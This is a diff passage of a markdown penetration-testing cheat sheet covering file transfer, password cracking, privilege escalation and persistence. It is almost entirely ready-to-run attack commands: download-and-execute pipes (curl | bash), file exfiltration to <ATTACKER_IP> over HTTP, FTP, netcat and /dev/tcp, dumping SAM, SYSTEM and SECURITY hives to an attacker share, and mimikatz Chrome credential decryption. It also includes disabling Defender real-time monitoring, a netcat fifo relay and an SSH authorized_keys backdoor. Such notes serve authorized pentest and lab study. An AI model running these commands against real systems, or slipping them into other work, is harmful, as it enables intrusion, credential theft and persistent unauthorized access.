+(New-Object Net.WebClient).DownloadFile('<DOWNLOAD_URL>','<OUTPUT_FILE>')
+
+# Download (NON-INTERACTIVELY)
+echo open <ATTACKER_IP> > ftpconfig.txt
+echo USER anonymous >> ftpconfig.txt
+echo binary >> ftpconfig.txt
+echo GET <FILE> >> ftpconfig.txt
+echo bye >> ftpconfig.txt
+
+ftp -v -n -s:ftpconfig.txt
+
+### === WinRM ===
+# TCP/5985 or 5986
+# Windows Remote Management service
+# user in "Administrators" or "Remote Management Users"
+
+$Session = New-PSSession -ComputerName <TARGET>
+Copy-Item -FromSession $Session -Path <DOWNLOAD_FILE> -Destination <OUTPUT_FILE>
+
+### === COPY&PASTA ===
+
+# ENCODE: Windows
+$f="<FILE>" ; [Convert]::ToBase64String((Get-Content -path $f -Encoding byte)) ; Get-FileHash $f -Algorithm MD5 | select Hash
+# https://lolbas-project.github.io/lolbas/Binaries/Certutil/#encode
+certutil -encode <FILE> <ENCODED_FILE>
+
+# DECODE: Linux
+echo "<BASE64>" | base64 -d > <DECODED_FILE>.decode ; md5sum *.decode
 ```
 
-# Post-Exploitation
-
-## Backdoor Access
+### ⬆️ Windows => Upload
 
 ```bash
-# Attacker
-ssh-keygen -f ./target_backdoor_key -N "" -C "service@localhost" && echo "\n\necho '$(cat ./target_backdoor_key.pub)' >> ~/.ssh/authorized_keys\n\n"
+### === WEB ===
 
-# Target: !!! RUN COMMAND ABOVE !!!
+# --- UPLOAD Server ---
 
-# Attacker
-ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ./target_backdoor_key <USER>@<TARGET>
+pip3 install --break-system-packages uploadserver
+
+python3 -m uploadserver
+
+# https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
+Invoke-RestMethod -Uri http://<ATTACKER_IP>:8000/upload -Method POST -Form (New-Object -TypeName System.Collections.Hashtable -Property @{file = Get-Item <UPLOAD_FILE>})
+
+# --- UPLOAD Server ---
+
+# b64 decode from here
+nc -lvnp <PORT>
+
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+Invoke-WebRequest -Method POST -Uri http://<ATTACKER_IP>:<PORT>/ -Body $b64
+
+### === SMB ===
+# https://github.com/fortra/impacket/blob/master/examples/smbserver.py
+impacket-smbserver -smb2support -username <USERNAME> -password <PASSWORD> <SHARE_NAME> <SHARE_PATH>
+
+### === WEBDAV (HTTP) ===
+# https://github.com/mar10/wsgidav
+
+sudo pip3 install --break-system-packages wsgidav cheroot
+
+sudo wsgidav --host=0.0.0.0 --port=<PORT> --root=<DIRECTORY> --auth=anonymous
+
+# UPLOAD
+Invoke-RestMethod -Uri "http://<ATTACKER_IP>/<SHARE_NAME>/<FILENAME>" -Method POST -Form @{file = Get-Item "<LOCAL_FILE_PATH>"}
+
+### === FTP ===
+
+sudo pip3 install --break-system-packages pyftpdlib
+
+sudo python3 -m pyftpdlib --write --port <SERVER_PORT>
+
+(New-Object Net.WebClient).UploadFile('ftp://<ATTACKER_IP>/<SAVENAME>', '<UPLOAD_FILE>')
+
+# Upload (NON-INTERACTIVELY)
+echo open <ATTACKER_IP> > ftpconfig.txt
+echo USER anonymous >> ftpconfig.txt
+echo binary >> ftpconfig.txt
+echo PUT <FILE> >> ftpconfig.txt
+echo bye >> ftpconfig.txt
+
+ftp -v -n -s:ftpconfig.txt
+
+### === WinRM ===
+# TCP/5985 or 5986
+# Windows Remote Management service
+# user in "Administrators" or "Remote Management Users"
+
+$Session = New-PSSession -ComputerName <TARGET>
+Copy-Item -ToSession $Session -Path <UPLOAD_FILE> -Destination <OUTPUT_FILE>
+
+### === COPY&PASTA ===
+
+# ENCODE: Windows
+$f="<UPLOAD_FILE>" ; [Convert]::ToBase64String((Get-Content -path $f -Encoding byte)) ; Get-FileHash $f -Algorithm MD5 | select Hash
+
+# DECODE: Linux
+echo -n "<BASE64>" | base64 -d > <DECODED_FILE>.decode ; md5sum *.decode
 ```
 
-## Privilege Escalation (PrivEsc)
+### ⬇️ Linux <= Download
+
+```bash
+### === WEB ===
+
+# Download (FILE)
+wget -O <OUTPUT_FILE> <URL>
+curl -skLo <OUTPUT_FILE> <URL>
+
+# Download & Execute (FILELESS)
+wget -qO- <URL> | python3
+curl <URL> | bash
+
+# Create socket
+# Bash v2.04+ (compiled w/ --enable-net-redirections
+exec 3<>/dev/tcp/<TARGET>/<PORT>
+# Send data and read data from socket
+echo -e "GET / HTTP/1.1\n\n">&3 ; cat <&3
+
+# Python (FILE)
+python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<OUTPUT_FILE>")'
+python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<OUTPUT_FILE>")'
+
+# PHP (FILE)
+php -r '$file = file_get_contents("<URL>"); file_put_contents("<OUTPUT_FILE>",$file);'
+php -r 'const BUFFER = 1024; $fremote = 
+fopen("<URL>", "rb"); $flocal = fopen("<OUTPUT_FILE>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+# PHP (FILELESS)
+php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+
+# Ruby
+ruby -e 'require "net/http"; File.write("<OUTPUT_FILE>", Net::HTTP.get(URI.parse("<URL>")))'
+
+# Perl
+perl -e 'use LWP::Simple; getstore("<URL>", "<OUTPUT_FILE>");'
+
+# --- WEB Encrypted ---
+
+openssl req -newkey rsa:2048 -x509 -nodes -sha256 -subj '/CN=backup' -out server.pem -keyout key.pem
+# Host file for download
+openssl s_server -quiet -accept <LISTEN_PORT> -cert server.pem -key key.pem < <UPLOAD_FILE>
+# Download file
+openssl s_client -quiet -connect <TARGET>:<PORT> > <DOWNLOAD_FILE>
+
+### === SSH ===
+
+# ATTACKER BOX: create dummy low priv user
+sudo systemctl enable --now ssh
+sudo useradd backup -m -d /home/backup -s /usr/sbin/nologin
+sudo bash -c 'echo "backup:987!BackupUser!123" | chpasswd'
+
+# TARGET
+scp backup@<ATTACKER_IP>:<DOWNLOAD_FILE> <OUTPUT_FILE>
+
+### === BINARY ===
+
+# to/receive file
+nc -lvnp <PORT> > <OUTPUT_FILE>
+ncat --recv-only -lp <PORT> > <OUTPUT_FILE>
+
+# from/send file
+nc -q0 <TARGET> <PORT> < <UPLOAD_FILE>
+ncat --send-only <TARGET> <PORT> < <UPLOAD_FILE>
+cat <UPLOAD_FILE> > /dev/tcp/<TARGET>/<PORT>
+
+### === COPY&PASTA ===
+
+# ATTACKER BOX: ENCODE
+f="<FILE>" ; cat "$f" | base64 -w0 ; echo ; md5sum "$f"
+
+# TARGET: DECODE
+echo -n "<BASE64>" | base64 -d > <DECODED_FILE> ; md5sum <DECODED_FILE>
+```
+
+### ⬆️ Linux => Upload
+
+```bash
+### === WEB ===
+
+# --- Python3 uploadserver ---
+
+pip3 install --break-system-packages uploadserver
+
+# ATTACKER BOX
+openssl req -newkey rsa:2048 -x509 -nodes -sha256 -subj '/CN=backup' -out server.pem -keyout server.pem
+mkdir https && cd https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+
+# TARGET
+curl --insecure -X POST https://<ATTACKER_IP>/upload -F 'files=@<UPLOAD_FILE>' -F 'files=@<UPLOAD_FILE>'
+python3 -c 'import requests;requests.post("https://<ATTACKER_IP>/upload",files={"files":open("<UPLOAD_FILE>","rb")}, verify=False)'
+
+# --- ngninx ---
+
+sudo mkdir -p /var/www/uploads/<UP_DIR>
+sudo chown -R www-data:www-data /var/www/uploads/<UP_DIR>
+echo 'server {
+    listen <LISTEN_PORT>;
+    location /<UP_DIR>/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}' | sudo tee /etc/nginx/sites-available/upload.conf
+sudo ln -fs /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+# Needed to stop listening on port 80
+sudo rm /etc/nginx/sites-enabled/default
+sudo systemctl start nginx.service
+
+# Upload file
+curl --upload-file <UPLOAD_FILE> http://<TARGET>:<LISTEN_PORT>/<UP_DIR>/<UPLOAD_FILE> 
+
+### === SERVER on TARGET ===
+
+# TARGET
+python3 -m http.server <PORT>
+python2.7 -m SimpleHTTPServer <PORT>
+php -S 0.0.0.0:<PORT>
+ruby -run -e httpd . -p <PORT>
+
+# ATTACKER BOX
+wget http://<TARGET>:<PORT>
+
+### === SSH ===
+
+# ATTACKER BOX
+scp backup@<ATTACKER_IP>:<DOWNLOAD_FILE> <TARGET_LOCATION>
+
+### === BINARY ===
+
+# to/receive file
+nc -lvnp <PORT> > <OUTPUT_FILE>
+ncat --recv-only -lp <PORT> > <OUTPUT_FILE>
+
+# from/send file
+nc -q0 <ATTACKER_IP> <PORT> < <DOWNLOAD_FILE>
+ncat --send-only <ATTACKER_IP> <PORT> < <DOWNLOAD_FILE>
+cat <DOWNLOAD_FILE> > /dev/tcp/<ATTACKER_IP>/<PORT>
+```
+
+## 🔓 Passwords
+
+- https://openwall.info/wiki/john/sample-hashes
+- https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
+- https://hashes.com/en/tools/hash_identifier
+
+```bash
+# Give JtR and hashcat --format code
+hashid -jm '<HASH>'
+
+# Create wordlist from website
+# e.g. make all words lowercase, spider down the website X, and choose only word certain legth Y or more
+cewl --lowercase -d <SPIDER_DEPTH> -m <MIN_WORD_LENGTH>  -w <WORDLIST_FILENAME>
+```
+
+### Searching for Interesting Files
+
+Unencrypted and encrypted...
+
+```bash
+# Find Potentially Useful Files
+for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*") ; do echo -e "\nFile extension: " $ext ; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ; done
+
+---
+
+# Find all JtR Utilities
+sudo updatedb && locate '*2john' | grep -v 'pycache'
+
+# Zip
+zip2john <ZIP_FILE> > hash_zip.txt
+
+# RAR
+rar2john <RAR_FILE> > hash_rar.txt
+
+# Office docs
+office2john <OFFICE_FILE> > hash_office.txt
+
+# PDF
+pdf2john <PDF_FILE> > hash_pdf.txt
+
+# Bitlocker
+bitlocker2john -i <VHD_FILE> > pre_hash_vhd.txt
+grep "bitlocker\$0" pre_hash_vhd.txt > hash_crackme_vhd.txt
+hashcat -a 0 -m 22100 hash_crackme_vhd.txt <WORDLIST>
+
+# Mount w/ Bitlocker
+sudo apt install -y dislocker
+sudo mkdir -p /media/{bitlocker,bitlockermount}
+sudo losetup -f -P Backup.vhd
+ls -la /dev/loop*
+sudo dislocker /dev/<LOOP_DEV> -u<PASSWORD> -- /media/bitlocker
+sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
+
+# SSH: find Private Keys
+grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
+# See if private key is password protected
+ssh-keygen -yf <PRIVKEY>
+# Get hash of key
+ssh2john <PRIVKEY> > ssh.hash
+
+# OpenSSL
+while read p; do
+    openssl enc -aes-256-cbc -d -in <ENC_FILE> -k "$p" 2>/dev/null | tar xz 2>/dev/null
+    if [ $? -eq 0 ]; then
+        echo "Success! Password is: $p"
+        break
+    fi
+done < <WORDLIST>
+```
+
+#### Windows Hashes
+
+- https://attack.mitre.org/techniques/T1003/002/
+
+```bash
+# ATTACKER: create SMB share
+
+# TARGET: save creds hives
+reg.exe save HKLM\SAM "%APPDATA%\sam.save"
+reg.exe save hklm\SYSTEM "%APPDATA%\system.save"
+reg.exe save hklm\SECURITY "%APPDATA%\security.save"
+
+cd %APPDATA%
+move *.save \\<ATTACKER_IP\<SHARE>\
+
+# ATTACKER: extract local NT hashes
+impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
+
+# 1000 is for NT hashes
+hashcat -m 1000 <HASHES> <WORDLIST>
+# 2100 is for PBKDF2 (DCC2 hashes for domain)
+hashcat -m 2100 <HASHES> <WORDLIST>
+
+# DPAPI creds
+mimikatz.exe
+dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+```
+
+##### Windows (SAM / NTLM) Constants
+
+| Hash Value                             | Type   | Meaning / Context                                                                                                            |
+| :------------------------------------- | :----- | :--------------------------------------------------------------------------------------------------------------------------- |
+| **`aad3b435b51404eeaad3b435b51404ee`** | **LM** | **Empty / Disabled.** LM is disabled on modern Windows, so this is the placeholder you will see for *every* user. Ignore it. |
+| **`31d6cfe0d16ae931b73c59d7e0c089c0`** | **NT** | **Empty String.** The user has **no password**. Common for `Guest` or `Administrator` if not enabled/set.                    |
+
+
+```bash
+# Remotely dump LSA secrets
+netexec smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --lsa
+# Remotely dump SAM secrets
+netexec smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --sam
+```
+
+### Common Web / Generic Constants
+
+| Hash Value | Type | Meaning |
+| :--- | :--- | :--- |
+| **`d41d8cd98f00b204e9800998ecf8427e`** | **MD5** | **Empty String** (0 byte input) |
+| **`da39a3ee5e6b4b0d3255bfef95601890afd80709`** | **SHA1** | **Empty String** (0 byte input) |
+| **`e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`** | **SHA256** | **Empty String** (0 byte input) |
+
+### Cracking Passwords
+
+#### 🔨  John the Ripper
+
+- https://www.openwall.com/john/doc/OPTIONS.shtml
+
+```bash
+# John attempts to guess the hash type, but specifiying the FORMAT is recommended
+john --list=formats
+
+# john --format=NT
+# john --format=raw-md5
+# john --format=sha512crypt
+john --format=<FORMAT> --wordlist=<WORDLIST> --output=john_cracked_hashes.txt <HASH_FILE>
+
+# Single crack mode: makes permutations given a username
+unshadow passwd.txt shadow.txt > unshadowed.txt
+john --format=<FORMAT> --single --output=john_cracked_single.txt <UNSHADOW_FILE>
+
+# Dynamically generated wordlist using Markov chains
+john --incremental <HASH_FILE>
+```
+
+#### 🔨  Hashcat
+
+- https://hashcat.net/wiki/doku.php?id=example_hashes
+- `/usr/share/hashcat/rules`
+- https://pentesting.site/cheat-sheets/hashcat/
+
+```bash
+# Crack an MD5crypt hash with a salt using Hashcat
+hashcat -m 20 <HASH>:<SALT> <WORDLIST>
+
+# Crack a SHA512crypt hash using Hashcat
+hashcat -m 1800 hashes.txt <WORDLIST>
+# 64 standard password modifications like: appending nums or substituting characters with their "leet" equivalents 
+hashcat -m 1800 -r /usr/share/hashcat/rules/best64.rule hashes.txt <WORDLIST>
+```
+
+##### Mask attack (`-a 3`) with Charsets
+
+| Symbol   | Description | Charset / Definition                |
+| :------- | :---------- | :---------------------------------- |
+| **`?l`** | Lowercase   | `abcdefghijklmnopqrstuvwxyz`        |
+| **`?u`** | Uppercase   | `ABCDEFGHIJKLMNOPQRSTUVWXYZ`        |
+| **`?d`** | Digits      | `0123456789`                        |
+| **`?h`** | Hex (Lower) | `0123456789abcdef`                  |
+| **`?H`** | Hex (Upper) | `0123456789ABCDEF`                  |
+| **`?s`** | Special     | «space»!"#$%&'()*+,-./:;<=>?@[]^_{` |
+| **`?a`** | All         | `?l?u?d?s`                          |
+| **`?b`** | Binary      | `0x00 - 0xff`                       |
+
+```bash
+hashcat -a 3 -m <HASH_ID> <HASH> '?u?l?l?l?l?d?s'
+```
+
+##### Create Custom Permutated Wordlist
+
+- https://hashcat.net/wiki/doku.php?id=rule_based_attack
+
+```bash
+# Manually generate keywords or use cewl via OSINT
+cat << EOF > keywords.txt
+<KEYWORDS>
+EOF
+
+# c - Capitalize the first character, lowercase the rest
+# C - Lowercase the first character, uppercase the rest
+# t - Toggle the case of all characters in a word
+# $! - Appends the character ! to the end 
+# $1$9$9$8 - Appends '1998' to the end
+# $1$9$9$8$! - Appends '1998!' to the end
+# sa@ - Replace all instances of a with @
+# so0 - Replace all instances of o with 0
+# ss$ - Replace all instances of s with $
+cat << EOF > custom.rule
+c
+C
+t                                                                \$!
+\$1\$9\$9\$8
+\$1\$9\$9\$8\$!
+sa@
+so0
+ss\$
+EOF
+
+# Generate permutated wordlist
+hashcat --force -r custom.rule keywords.txt  --stdout | sort -u > wordlist.txt
+
+# Crack hash
+hashcat -a 0 -m <HASH_ID> -r custom.rule <HASH> wordlist.txt
+```
+
+## ⬆️ Privilege Escalation (PrivEsc)
 
 **NOTE:** scripts are noisy for any sort of monitoring software, so manual checks may be preferred
 
-### Linux
+### 🐧 Linux
 
-- https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md
 - https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 - https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/
+- https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md
 - https://gtfobins.github.io/
+    - `+file download`
+    - `+file upload`
 
-#### linPEAS
+#### 🔍 linPEAS
 
 ```bash
 # === ATTACKER ===
@@ -1151,21 +1963,68 @@ ls -la /home/*/.ssh/
 ls -la /root/.ssh/
 ```
 
-### Windows
+### 🪟 Windows
 
-- https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
 - https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
-- https://github.com/GhostPack/Seatbelt
-- https://lolbas-project.github.io/#
+- https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/
+- PrivEsc: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
+- PowerShell Scripts: https://github.com/samratashok/nishang
+- Living Off the Land: https://lolbas-project.github.io/
+    - `/upload`
+    - `/download`
 
 ```bash
 for %f in ("C:\Program Files", "C:\Program Files (x86)") do @(echo. && echo --- Listing: %~f --- && dir "%~f" /b)
 ```
 
-# Lateral Movement
+## Security Products
 
-# Proof-of-Concept/Reporting
+```powershell
+# Disable WinDefend realtime monitoring
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
 
-# Post-Engagement
+## Nice Commands
+
+These will be a grab-bag of command workarounds usually for restricted systems that lack certain functionality.
+
+```bash
+# PORT FORWARD 0.0.0.0:<LISTEN_PORT> => <TARGET>:<FORWARD_PORT>
+# NOTE: use normal netcat (w/o "-e" or "-c" options)
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | nc <TARGET> <FORWARD_PORT> 2>&1 | nc -lvnp <LISTEN_PORT> > /tmp/f
+
+# Unzip w/ Python3
+python3 -c 'import zipfile, sys; zip_ref = zipfile.ZipFile(sys.argv[1], "r"); zip_ref.extractall("."); zip_ref.close()' <ZIPFILE>
+
+# Unzip w/ Perl
+perl -e 'use Archive::Zip; my $zip = Archive::Zip->new(shift); $zip->extractTree();' <ZIPFILE>
+
+# strings replacement
+f="<FILE>" ; cat $f | tr -c '[:print:]\t\n' '[\n*]' | awk 'length > 3' | less
+
+# string replacement
+f="<FILE>" ; sed 's/[^[:print:]]/\n/g' $f | awk 'length > 3' | less
+```
+
+```powershell
+# Get PS Version
+$PSversiontable
+```
+## 🚪 Backdoor Access
+
+```bash
+# Attacker
+ssh-keygen -f ./target_backdoor_key -N "" -C "service@localhost" && echo "\n\necho '$(cat ./target_backdoor_key.pub)' >> ~/.ssh/authorized_keys\n\n"
+
+# Target: !!! RUN COMMAND ABOVE !!!
+
+# Attacker
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ./target_backdoor_key <USER>@<TARGET>
+```
+
+# 🔀 Lateral Movement
+
+# 📝 Proof-of-Concept/Reporting
+
+# ✅ Post-Engagement
 
